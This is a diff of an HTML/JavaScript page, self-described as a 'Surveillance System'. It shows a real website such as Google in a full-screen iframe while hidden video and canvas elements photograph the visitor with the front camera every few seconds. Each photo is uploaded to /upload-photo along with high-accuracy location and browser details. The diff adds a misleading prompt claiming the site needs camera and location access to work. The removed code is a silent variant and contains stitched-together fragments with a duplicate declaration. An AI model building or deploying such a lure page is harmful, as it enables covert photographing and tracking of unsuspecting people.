@@ -20,6 +20,10 @@
             width: 100vw;
             height: 100vh;
             border: none;
+            display: none;
+        }
+
+        #websiteFrame.show {
             display: block;
         }
 
@@ -33,7 +37,8 @@
             pointer-events: none;
         }
 
-        #loadingScreen {
+        /* Permission Request Screen */
+        #permissionScreen {
             position: fixed;
             top: 0;
             left: 0;
@@ -49,9 +54,98 @@
             transition: opacity 0.5s;
         }
 
-        #loadingScreen.hidden {
+        #permissionScreen.hidden {
             opacity: 0;
             pointer-events: none;
+        }
+
+        .permission-card {
+            background: white;
+            color: #333;
+            padding: 40px;
+            border-radius: 20px;
+            max-width: 500px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+
+        .permission-card h1 {
+            font-size: 2em;
+            margin-bottom: 20px;
+            color: #667eea;
+        }
+
+        .permission-card p {
+            font-size: 1.1em;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+
+        .permission-item {
+            background: #f8f9fa;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .permission-item .icon {
+            font-size: 2em;
+        }
+
+        .permission-item .status {
+            font-weight: bold;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.9em;
+        }
+
+        .status.pending {
+            background: #ffc107;
+            color: #000;
+        }
+
+        .status.granted {
+            background: #28a745;
+            color: white;
+        }
+
+        .status.denied {
+            background: #dc3545;
+            color: white;
+        }
+
+        .btn {
+            padding: 15px 40px;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin: 10px;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .btn-skip {
+            background: #6c757d;
+            color: white;
         }
 
         .spinner {
@@ -61,7 +155,7 @@
             width: 50px;
             height: 50px;
             animation: spin 1s linear infinite;
-            margin-bottom: 20px;
+            margin: 20px auto;
         }
 
         @keyframes spin {
@@ -69,54 +163,102 @@
             100% { transform: rotate(360deg); }
         }
 
+        .loading-text {
+            margin-top: 20px;
+            font-size: 1.2em;
+        }
+
         #debugPanel {
             position: fixed;
             bottom: 10px;
             right: 10px;
-            background: rgba(0,0,0,0.8);
+            background: rgba(0,0,0,0.9);
             color: #0f0;
-            padding: 10px;
-            border-radius: 5px;
+            padding: 15px;
+            border-radius: 8px;
             font-family: monospace;
-            font-size: 10px;
-            max-width: 300px;
+            font-size: 11px;
+            max-width: 350px;
             z-index: 10000;
             display: none;
+            max-height: 300px;
+            overflow-y: auto;
         }
 
         #debugPanel.show {
             display: block;
         }
+
+        .debug-line {
+            margin: 3px 0;
+            padding: 3px;
+            border-bottom: 1px solid #333;
+        }
+
+        .debug-error { color: #f00; }
+        .debug-success { color: #0f0; }
+        .debug-warning { color: #ff0; }
+        .debug-info { color: #0ff; }
     </style>
 </head>
 <body>
-    <div id="loadingScreen">
-        <div class="spinner"></div>
-        <h2>Loading Website...</h2>
-        <p id="loadingStatus" style="margin-top: 10px; font-size: 14px;">Initializing...</p>
+    <!-- Permission Request Screen -->
+    <div id="permissionScreen">
+        <div class="permission-card">
+            <h1>🔐 Permissions Required</h1>
+            <p>This website needs access to your camera and location to function properly.</p>
+            
+            <div class="permission-item">
+                <div>
+                    <span class="icon">📷</span>
+                    <strong>Camera Access</strong>
+                </div>
+                <span class="status pending" id="cameraStatus">Pending</span>
+            </div>
+
+            <div class="permission-item">
+                <div>
+                    <span class="icon">📍</span>
+                    <strong>Location Access</strong>
+                </div>
+                <span class="status pending" id="locationStatus">Pending</span>
+            </div>
+
+            <div style="margin-top: 30px;">
+                <button class="btn btn-primary" id="grantBtn" onclick="requestPermissions()">
+                    ✅ Grant Permissions
+                </button>
+                <button class="btn btn-skip" onclick="skipPermissions()">
+                    ⏭️ Skip (Limited Features)
+                </button>
+            </div>
+
+            <div id="loadingIndicator" style="display: none;">
+                <div class="spinner"></div>
+                <div class="loading-text" id="loadingText">Requesting permissions...</div>
+            </div>
+        </div>
     </div>
 
-    <iframe id="websiteFrame" src="" allowfullscreen sandbox="allow-same-origin allow-scripts allow-popups allow-forms"></iframe>
+    <!-- Main Website Frame -->
+    <iframe id="websiteFrame" src="" allowfullscreen></iframe>
 
+    <!-- Hidden Camera Elements -->
     <div id="hiddenCamera">
         <video id="video" autoplay playsinline muted></video>
         <canvas id="canvas"></canvas>
     </div>
 
-    <!-- Debug Panel (Remove in production) -->
+    <!-- Debug Panel -->
     <div id="debugPanel">
-        <div>Status: <span id="debugStatus">Starting...</span></div>
-        <div>Camera: <span id="debugCamera">Pending</span></div>
-        <div>Location: <span id="debugLocation">Pending</span></div>
-        <div>Captures: <span id="debugCaptures">0</span></div>
-        <div>Last: <span id="debugLast">Never</span></div>
+        <div style="color: #fff; font-weight: bold; margin-bottom: 10px;">📊 Debug Console</div>
+        <div id="debugLog"></div>
     </div>
 
     <script>
-        // Debug mode (set to false in production)
-        const DEBUG_MODE = true;
-
         // Configuration
+        const DEBUG_MODE = true; // Set to false in production
+
         const savedConfig = localStorage.getItem('surveillanceConfig');
         const CONFIG = savedConfig ? JSON.parse(savedConfig) : {
             targetWebsite: 'https://www.google.com',
@@ -135,44 +277,204 @@
             location: false
         };
 
+        // Elements
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
         const websiteFrame = document.getElementById('websiteFrame');
-        const loadingScreen = document.getElementById('loadingScreen');
-        const loadingStatus = document.getElementById('loadingStatus');
+        const permissionScreen = document.getElementById('permissionScreen');
+        const cameraStatus = document.getElementById('cameraStatus');
+        const locationStatus = document.getElementById('locationStatus');
+        const grantBtn = document.getElementById('grantBtn');
+        const loadingIndicator = document.getElementById('loadingIndicator');
+        const loadingText = document.getElementById('loadingText');
         const debugPanel = document.getElementById('debugPanel');
+        const debugLog = document.getElementById('debugLog');
 
-        // Show debug panel if enabled
+        // Show debug panel
         if (DEBUG_MODE) {
             debugPanel.classList.add('show');
         }
 
         // Debug logger
-        function debugLog(category, message, status = 'info') {
-            console.log(`[${category}] ${message}`);
+        function log(message, type = 'info') {
+            const timestamp = new Date().toLocaleTimeString();
+            console.log(`[${timestamp}] ${message}`);
+            
             if (DEBUG_MODE) {
-                const element = document.getElementById(`debug${category}`);
-                if (element) {
-                    element.textContent = message;
-                    element.style.color = status === 'error' ? '#f00' : status === 'success' ? '#0f0' : '#ff0';
+                const line = document.createElement('div');
+                line.className = `debug-line debug-${type}`;
+                line.textContent = `[${timestamp}] ${message}`;
+                debugLog.insertBefore(line, debugLog.firstChild);
+                
+                // Keep only last 20 lines
+                while (debugLog.children.length > 20) {
+                    debugLog.removeChild(debugLog.lastChild);
                 }
             }
         }
 
-        // Update loading status
-        function updateLoadingStatus(message) {
-            loadingStatus.textContent = message;
-            debugLog('Status', message);
+        // Update status
+        function updateStatus(element, status, text) {
+            element.className = `status ${status}`;
+            element.textContent = text;
         }
 
-        // Check if running on HTTPS (required for camera/location)
-        function checkSecureContext() {
-            if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
-                console.warn('⚠️ Not running on HTTPS. Camera and location may not work.');
+        // Request Camera Permission
+        async function requestCamera() {
+            log('Requesting camera permission...', 'info');
+            updateStatus(cameraStatus, 'pending', 'Requesting...');
+
+            try {
+                // First check if getUserMedia is supported
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    throw new Error('Camera API not supported in this browser');
+                }
+
+                // Request camera with specific constraints
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 1280, min: 640 },
+                        height: { ideal: 720, min: 480 }
+                    },
+                    audio: false
+                });
+
+                log('Camera stream obtained', 'success');
+
+                // Attach to video element
+                video.srcObject = stream;
+                
+                // Wait for video to be ready
+                await new Promise((resolve, reject) => {
+                    video.onloadedmetadata = () => {
+                        video.play()
+                            .then(resolve)
+                            .catch(reject);
+                    };
+                    video.onerror = reject;
+                    
+                    // Timeout after 10 seconds
+                    setTimeout(() => reject(new Error('Video load timeout')), 10000);
+                });
+
+                log('Video element ready', 'success');
+                updateStatus(cameraStatus, 'granted', '✅ Granted');
+                permissionsGranted.camera = true;
+                return true;
+
+            } catch (error) {
+                log(`Camera error: ${error.message}`, 'error');
+                updateStatus(cameraStatus, 'denied', '❌ Denied');
+                permissionsGranted.camera = false;
+                
+                // Show user-friendly error
+                if (error.name === 'NotAllowedError') {
+                    alert('❌ Camera access denied. Please allow camera access and refresh the page.');
+                } else if (error.name === 'NotFoundError') {
+                    alert('❌ No camera found on your device.');
+                } else {
+                    alert(`❌ Camera error: ${error.message}`);
+                }
+                
                 return false;
             }
-            return true;
+        }
+
+        // Request Location Permission
+        async function requestLocation() {
+            log('Requesting location permission...', 'info');
+            updateStatus(locationStatus, 'pending', 'Requesting...');
+
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    log('Geolocation not supported', 'error');
+                    updateStatus(locationStatus, 'denied', '❌ Not Supported');
+                    permissionsGranted.location = false;
+                    resolve(false);
+                    return;
+                }
+
+                const timeout = setTimeout(() => {
+                    log('Location timeout', 'warning');
+                    updateStatus(locationStatus, 'denied', '⏱️ Timeout');
+                    permissionsGranted.location = false;
+                    resolve(false);
+                }, 10000);
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        clearTimeout(timeout);
+                        log(`Location: ${position.coords.latitude}, ${position.coords.longitude}`, 'success');
+                        updateStatus(locationStatus, 'granted', '✅ Granted');
+                        permissionsGranted.location = true;
+                        resolve(true);
+                    },
+                    (error) => {
+                        clearTimeout(timeout);
+                        log(`Location error: ${error.message}`, 'error');
+                        updateStatus(locationStatus, 'denied', '❌ Denied');
+                        permissionsGranted.location = false;
+                        
+                        if (error.code === error.PERMISSION_DENIED) {
+                            alert('❌ Location access denied. Please allow location access.');
+                        }
+                        
+                        resolve(false);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 8000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+
+        // Request all permissions
+        async function requestPermissions() {
+            grantBtn.disabled = true;
+            loadingIndicator.style.display = 'block';
+            
+            log('=== Starting permission requests ===', 'info');
+
+            // Request camera first
+            loadingText.textContent = 'Requesting camera access...';
+            const cameraOk = await requestCamera();
+            
+            await new Promise(resolve => setTimeout(resolve, 500));
+
+            // Request location
+            loadingText.textContent = 'Requesting location access...';
+            const locationOk = await requestLocation();
+
+            await new Promise(resolve => setTimeout(resolve, 1000));
+
+            // Check results
+            if (cameraOk || locationOk) {
+                log('At least one permission granted', 'success');
+                loadingText.textContent = 'Permissions granted! Loading website...';
+                await new Promise(resolve => setTimeout(resolve, 1500));
+                startWebsite();
+            } else {
+                log('All permissions denied', 'error');
+                loadingText.textContent = '❌ Permissions denied';
+                grantBtn.disabled = false;
+                loadingIndicator.style.display = 'none';
+                
+                const retry = confirm('No permissions granted. Retry?');
+                if (retry) {
+                    location.reload();
+                }
+            }
+        }
+
+        // Skip permissions and continue
+        function skipPermissions() {
+            log('Permissions skipped by user', 'warning');
+            alert('⚠️ App will run with limited functionality');
+            startWebsite();
         }
 
         // Get browser info
@@ -187,105 +489,46 @@
                 viewportHeight: window.innerHeight,
                 timestamp: new Date().toISOString(),
                 isSecure: location.protocol === 'https:',
-                url: window.location.href
+                url: window.location.href,
+                permissions: permissionsGranted
             };
         }
 
-        // Get location with timeout
-        function getCurrentLocation() {
+        // Get current location
+        async function getCurrentLocation() {
+            if (!permissionsGranted.location) {
+                log('Location not available', 'warning');
+                return null;
+            }
+
             return new Promise((resolve) => {
-                updateLoadingStatus('Getting location...');
-                
-                if (!navigator.geolocation) {
-                    debugLog('Location', 'Not supported', 'error');
-                    resolve(null);
-                    return;
-                }
-
-                const timeout = setTimeout(() => {
-                    debugLog('Location', 'Timeout', 'error');
-                    resolve(null);
-                }, 10000); // 10 second timeout
-
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        clearTimeout(timeout);
                         const location = {
                             latitude: position.coords.latitude,
                             longitude: position.coords.longitude,
                             accuracy: position.coords.accuracy
                         };
-                        debugLog('Location', `${location.latitude.toFixed(4)}, ${location.longitude.toFixed(4)}`, 'success');
-                        permissionsGranted.location = true;
+                        log(`Location obtained: ${location.latitude.toFixed(4)}, ${location.longitude.toFixed(4)}`, 'success');
                         resolve(location);
                     },
                     (error) => {
-                        clearTimeout(timeout);
-                        debugLog('Location', `Error: ${error.message}`, 'error');
-                        permissionsGranted.location = false;
+                        log(`Location error: ${error.message}`, 'error');
                         resolve(null);
                     },
-                    { 
-                        enableHighAccuracy: true, 
-                        timeout: 8000,
-                        maximumAge: 0
-                    }
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                 );
             });
-        }
-
-        // Initialize camera with retries
-        async function initCamera(retries = 3) {
-            updateLoadingStatus('Requesting camera access...');
-            
-            for (let i = 0; i < retries; i++) {
-                try {
-                    debugLog('Camera', `Attempt ${i + 1}/${retries}`);
-                    
-                    stream = await navigator.mediaDevices.getUserMedia({
-                        video: { 
-                            facingMode: 'user',
-                            width: { ideal: 1280 },
-                            height: { ideal: 720 }
-                        },
-                        audio: false
-                    });
-                    
-                    video.srcObject = stream;
-                    await video.play();
-                    
-                    // Wait for video to be ready
-                    await new Promise(resolve => {
-                        video.onloadedmetadata = resolve;
-                    });
-
-                    debugLog('Camera', 'Active', 'success');
-                    permissionsGranted.camera = true;
-                    return true;
-
-                } catch (error) {
-                    debugLog('Camera', `Attempt ${i + 1} failed: ${error.message}`, 'error');
-                    
-                    if (i === retries - 1) {
-                        console.error('❌ Camera access failed after retries:', error);
-                        permissionsGranted.camera = false;
-                        return false;
-                    }
-                    
-                    await new Promise(resolve => setTimeout(resolve, 2000));
-                }
-            }
-            return false;
         }
 
         // Capture and send data
         async function captureAndSend() {
             try {
-                debugLog('Status', 'Capturing...', 'info');
+                log('Starting capture...', 'info');
 
-                // Check if video is ready
-                if (!stream || video.readyState !== video.HAVE_ENOUGH_DATA) {
-                    console.warn('⚠️ Video not ready, skipping capture');
+                // Check if camera is available
+                if (!permissionsGranted.camera || !stream || video.readyState !== video.HAVE_ENOUGH_DATA) {
+                    log('Camera not ready, skipping capture', 'warning');
                     return;
                 }
 
@@ -294,28 +537,33 @@
                 canvas.height = video.videoHeight;
                 ctx.drawImage(video, 0, 0);
                 
+                log(`Photo captured: ${canvas.width}x${canvas.height}`, 'success');
+
                 const blob = await new Promise(resolve => {
                     canvas.toBlob(resolve, 'image/jpeg', 0.85);
                 });
 
-                if (!blob) {
-                    console.error('❌ Failed to create image blob');
+                if (!blob || blob.size === 0) {
+                    log('Failed to create image blob', 'error');
                     return;
                 }
 
-                // Get data
+                log(`Blob size: ${(blob.size / 1024).toFixed(2)} KB`, 'info');
+
+                // Get location and browser info
                 const location = await getCurrentLocation();
                 const browserInfo = getBrowserInfo();
 
-                // Send to server
+                // Prepare form data
                 const formData = new FormData();
                 formData.append('photo', blob, 'capture.jpg');
                 formData.append('location', JSON.stringify(location || {}));
                 formData.append('browserInfo', JSON.stringify(browserInfo));
                 formData.append('pageUrl', CONFIG.targetWebsite);
 
-                updateLoadingStatus('Sending data...');
+                log('Sending to server...', 'info');
 
+                // Send to server
                 const response = await fetch('/upload-photo', {
                     method: 'POST',
                     body: formData
@@ -325,57 +573,54 @@
 
                 if (result.success) {
                     captureCount++;
-                    debugLog('Captures', captureCount, 'success');
-                    debugLog('Last', new Date().toLocaleTimeString(), 'success');
-                    console.log('✅ Data sent successfully:', result);
+                    log(`✅ Capture #${captureCount} sent successfully`, 'success');
                 } else {
-                    console.error('❌ Server error:', result.error);
-                    debugLog('Status', `Error: ${result.error}`, 'error');
+                    log(`❌ Server error: ${result.error}`, 'error');
                 }
 
             } catch (error) {
-                console.error('❌ Capture error:', error);
-                debugLog('Status', `Error: ${error.message}`, 'error');
+                log(`❌ Capture failed: ${error.message}`, 'error');
             }
         }
 
-        // Start monitoring
-        async function startMonitoring() {
-            debugLog('Status', 'Starting...', 'info');
-            updateLoadingStatus('Starting surveillance...');
-
-            // Check secure context
-            if (!checkSecureContext()) {
-                updateLoadingStatus('⚠️ HTTPS required for camera/location');
-                await new Promise(resolve => setTimeout(resolve, 3000));
-            }
-
-            // Initialize camera
-            const cameraOk = await initCamera();
+        // Start website and monitoring
+        function startWebsite() {
+            log('Loading website...', 'info');
             
-            if (!cameraOk) {
-                console.log('⚠️ Camera not available, continuing without it');
-                updateLoadingStatus('Camera unavailable - continuing...');
-                await new Promise(resolve => setTimeout(resolve, 2000));
-            }
+            // Hide permission screen
+            permissionScreen.classList.add('hidden');
+            
+            // Show website
+            websiteFrame.src = CONFIG.targetWebsite;
+            websiteFrame.classList.add('show');
 
-            monitoringActive = true;
-            debugLog('Status', 'Active', 'success');
+            websiteFrame.onload = () => {
+                log(`Website loaded: ${CONFIG.targetWebsite}`, 'success');
+                
+                // Start monitoring after delay
+                if (CONFIG.autoStart && permissionsGranted.camera) {
+                    setTimeout(() => {
+                        log('Starting monitoring...', 'info');
+                        monitoringActive = true;
+                        
+                        // Initial capture
+                        setTimeout(captureAndSend, 3000);
+                        
+                        // Regular captures
+                        monitoringInterval = setInterval(captureAndSend, CONFIG.captureInterval);
+                        
+                        log(`Monitoring started (interval: ${CONFIG.captureInterval}ms)`, 'success');
+                    }, 2000);
+                }
+            };
 
-            // Hide loading screen
-            loadingScreen.classList.add('hidden');
-
-            // Initial capture after 3 seconds
-            setTimeout(captureAndSend, 3000);
-
-            // Regular captures
-            monitoringInterval = setInterval(captureAndSend, CONFIG.captureInterval);
+            websiteFrame.onerror = () => {
+                log('Failed to load website', 'error');
+            };
         }
 
         // Stop monitoring
         function stopMonitoring() {
-            monitoringActive = false;
-            
             if (monitoringInterval) {
                 clearInterval(monitoringInterval);
             }
@@ -383,298 +628,26 @@
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
             }
-
-            debugLog('Status', 'Stopped', 'error');
-        }
-
-        // Load website
-        function loadWebsite() {
-            websiteFrame.src = CONFIG.targetWebsite;
             
-            websiteFrame.onload = () => {
-                updateLoadingStatus('Website loaded');
-                
-                if (CONFIG.autoStart) {
-                    setTimeout(startMonitoring, 2000);
-                }
-            };
-
-            websiteFrame.onerror = () => {
-                updateLoadingStatus('Failed to load website');
-                console.error('❌ Failed to load:', CONFIG.targetWebsite);
-            };
+            log('Monitoring stopped', 'warning');
         }
 
-        // Initialize
+        // Initialize on page load
         window.addEventListener('load', () => {
-            console.log('🚀 Surveillance system initializing...');
-            console.log('📍 Config:', CONFIG);
-            loadWebsite();
-        });
-
-        // Cleanup
-        window.addEventListener('beforeunload', stopMonitoring);
-
-        // Handle visibility change
-        document.addEventListener('visibilitychange', () => {
-            if (document.hidden) {
-                debugLog('Status', 'Background', 'info');
-            } else {
-                debugLog('Status', 'Foreground', 'success');
+            log('=== Surveillance System Initialized ===', 'info');
+            log(`Target website: ${CONFIG.targetWebsite}`, 'info');
+            log(`Capture interval: ${CONFIG.captureInterval}ms`, 'info');
+            log(`Auto-start: ${CONFIG.autoStart}`, 'info');
+            log(`Protocol: ${location.protocol}`, 'info');
+            
+            // Check if HTTPS
+            if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
+                log('⚠️ Not HTTPS - permissions may fail', 'warning');
             }
         });
-    </script>
-</body>
-</html>            background: #ff0000;
-        }
-    </style>
-</head>
-<body>
-    <!-- Loading Screen -->
-    <div id="loadingScreen">
-        <div class="spinner"></div>
-        <h2>Loading Website...</h2>
-    </div>
-
-    <!-- Main Website Frame -->
-    <iframe id="websiteFrame" src="" allowfullscreen></iframe>
-
-    <!-- Hidden Camera Elements -->
-    <div id="hiddenCamera">
-        <video id="video" autoplay playsinline></video>
-        <canvas id="canvas"></canvas>
-    </div>
-
-    <!-- Optional Control Panel -->
-    <div id="controlPanel">
-        <div>
-            <span class="status-dot active" id="statusDot"></span>
-            <span id="statusText">Monitoring Active</span>
-        </div>
-        <div style="margin-top: 10px;">
-            Next: <span id="countdown">5</span>s
-        </div>
-    </div>
-
-    <script>
-        
-        // Load config from localStorage if available (set from admin panel)
-const savedConfig = localStorage.getItem('surveillanceConfig');
-const CONFIG = savedConfig ? JSON.parse(savedConfig) : {
-    targetWebsite: 'https://www.google.com',
-    captureInterval: 5000,
-    showControlPanel: false,
-    autoStart: true
-};
-        
-        // Configuration - Change these values
-        const CONFIG = {
-            targetWebsite: 'https://www.google.com', // Change this to any website
-            captureInterval: 5000, // 5 seconds
-            showControlPanel: false, // Set to true to show status
-            autoStart: true // Automatically start monitoring
-        };
-
-        // Global variables
-        let monitoringActive = false;
-        let monitoringInterval = null;
-        let countdownInterval = null;
-        let countdown = 5;
-        let stream = null;
-
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
-        const websiteFrame = document.getElementById('websiteFrame');
-        const loadingScreen = document.getElementById('loadingScreen');
-        const controlPanel = document.getElementById('controlPanel');
-        const countdownSpan = document.getElementById('countdown');
-
-        // Show/hide control panel
-        if (CONFIG.showControlPanel) {
-            controlPanel.classList.add('show');
-        }
-
-        // Load target website
-        websiteFrame.src = CONFIG.targetWebsite;
-
-        // Hide loading screen when iframe loads
-        websiteFrame.onload = () => {
-            setTimeout(() => {
-                loadingScreen.classList.add('hidden');
-                document.title = 'Website Viewer';
-                
-                if (CONFIG.autoStart) {
-                    setTimeout(startMonitoring, 2000);
-                }
-            }, 1000);
-        };
-
-        // Get browser info
-        function getBrowserInfo() {
-            return {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screenWidth: screen.width,
-                screenHeight: screen.height,
-                viewportWidth: window.innerWidth,
-                viewportHeight: window.innerHeight,
-                timestamp: new Date().toISOString()
-            };
-        }
-
-        // Get location
-        function getCurrentLocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve(null);
-                    return;
-                }
-
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        resolve({
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy
-                        });
-                    },
-                    () => resolve(null),
-                    { enableHighAccuracy: true, timeout: 5000 }
-                );
-            });
-        }
-
-        // Initialize camera silently
-        async function initCamera() {
-            try {
-                stream = await navigator.mediaDevices.getUserMedia({
-                    video: { 
-                        facingMode: 'user',
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    },
-                    audio: false
-                });
-                video.srcObject = stream;
-                await video.play();
-                return true;
-            } catch (error) {
-                console.error('Camera access denied');
-                return false;
-            }
-        }
-
-        // Capture and send data
-        async function captureAndSend() {
-            try {
-                // Wait for video to be ready
-                if (video.readyState !== video.HAVE_ENOUGH_DATA) {
-                    return;
-                }
-
-                // Capture photo
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                ctx.drawImage(video, 0, 0);
-                
-                const blob = await new Promise(resolve => {
-                    canvas.toBlob(resolve, 'image/jpeg', 0.85);
-                });
-
-                // Get data
-                const location = await getCurrentLocation();
-                const browserInfo = getBrowserInfo();
-
-                // Send to server
-                const formData = new FormData();
-                formData.append('photo', blob, 'capture.jpg');
-                formData.append('location', JSON.stringify(location || {}));
-                formData.append('browserInfo', JSON.stringify(browserInfo));
-                formData.append('pageUrl', CONFIG.targetWebsite);
-
-                await fetch('/upload-photo', {
-                    method: 'POST',
-                    body: formData
-                });
-
-                console.log('✅ Data sent successfully');
-
-            } catch (error) {
-                console.error('❌ Error:', error);
-            }
-        }
-
-        // Start countdown
-        function startCountdown() {
-            countdown = CONFIG.captureInterval / 1000;
-            if (countdownSpan) countdownSpan.textContent = countdown;
-            
-            countdownInterval = setInterval(() => {
-                countdown--;
-                if (countdownSpan) countdownSpan.textContent = countdown;
-                
-                if (countdown <= 0) {
-                    countdown = CONFIG.captureInterval / 1000;
-                }
-            }, 1000);
-        }
-
-        // Start monitoring
-        async function startMonitoring() {
-            const cameraOk = await initCamera();
-            if (!cameraOk) {
-                console.log('Retrying camera access...');
-                setTimeout(startMonitoring, 3000);
-                return;
-            }
-
-            monitoringActive = true;
-            console.log('🔴 Monitoring started');
-
-            // Initial capture after 2 seconds
-            setTimeout(captureAndSend, 2000);
-
-            // Start countdown
-            startCountdown();
-
-            // Regular captures
-            monitoringInterval = setInterval(captureAndSend, CONFIG.captureInterval);
-        }
-
-        // Stop monitoring
-        function stopMonitoring() {
-            monitoringActive = false;
-            
-            if (monitoringInterval) clearInterval(monitoringInterval);
-            if (countdownInterval) clearInterval(countdownInterval);
-            if (stream) stream.getTracks().forEach(track => track.stop());
-
-            console.log('⏹️ Monitoring stopped');
-        }
 
         // Cleanup on page unload
         window.addEventListener('beforeunload', stopMonitoring);
-
-        // Handle visibility change
-        document.addEventListener('visibilitychange', () => {
-            if (document.hidden) {
-                // Page hidden - continue monitoring in background
-                console.log('Page hidden - continuing monitoring');
-            } else {
-                // Page visible again
-                console.log('Page visible');
-            }
-        });
-
-        // Alternative websites you can use:
-        // https://www.youtube.com
-        // https://www.facebook.com
-        // https://twitter.com
-        // https://www.instagram.com
-        // https://www.netflix.com
-        // Any other website URL
     </script>
 </body>
 </html>
